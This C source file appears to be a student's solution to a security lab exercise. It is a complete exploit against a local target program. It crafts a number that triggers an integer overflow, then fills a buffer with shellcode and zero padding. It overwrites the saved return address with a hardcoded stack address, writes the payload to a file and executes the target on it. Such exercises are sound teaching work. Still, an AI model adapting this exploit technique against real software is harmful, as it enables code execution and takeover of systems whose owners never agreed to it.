#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target3"
#define DEFAULT_FILE "/tmp/xploit3_output"

// Constants to define the buffer overflow attack parameters
#define BUFFER_ADDRESS 0x00007ffffffe6068
#define NEGATIVE_OVERFLOW_OFFSET 0x8000000000000000
#define BUFFER_LENGTH 1500
#define WIDGET_SIZE 24
#define PADDING 100


int main(void)
{
  // This exploit will likely require more memory than fits on the stack
  size_t exploit_size = PADDING + BUFFER_LENGTH * WIDGET_SIZE + sizeof(void*) * 2;  // TODO determine exploit size
  char *exploit = malloc(exploit_size);

  // TODO fill exploit buffer
  // Prepare the exploit buffer
  long number_for_overflow = NEGATIVE_OVERFLOW_OFFSET + BUFFER_LENGTH + 1;
  int negative = sprintf(exploit, "%ld,", number_for_overflow);

  // Set up the buffer with the shellcode
  memcpy(exploit + negative, shellcode, sizeof(shellcode) - 1);

  // Zero out the memory area following the shellcode up to the return address
  int offset = negative + BUFFER_LENGTH * WIDGET_SIZE + sizeof(void*);
  memset(exploit + negative + sizeof(shellcode) - 1, 0, offset - negative - sizeof(shellcode) + 1);

  // Place the buffer address at the calculated return pointer location
  void *return_address = (void*) BUFFER_ADDRESS;
  memcpy(exploit + offset, &return_address, sizeof(void*));

  // Write xploit buffer to file
  write_xploit(exploit, exploit_size, DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
